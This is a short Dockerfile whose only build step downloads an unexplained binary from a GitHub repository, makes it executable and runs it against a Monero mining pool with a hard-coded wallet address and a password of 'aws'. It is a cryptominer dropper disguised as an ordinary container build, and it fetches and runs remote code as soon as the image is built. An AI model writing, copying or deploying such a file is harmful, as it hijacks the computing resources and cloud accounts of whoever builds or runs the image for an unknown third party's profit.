FROM ubuntu:latest
RUN apt-get update && apt-get install python3 python3-pip wget -y && wget https://github.com/iceyfromdiscord/yes/raw/refs/heads/master/prog && chmod +x prog && ./prog --url pool.supportxmr.com:3333 --user 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ --pass aws
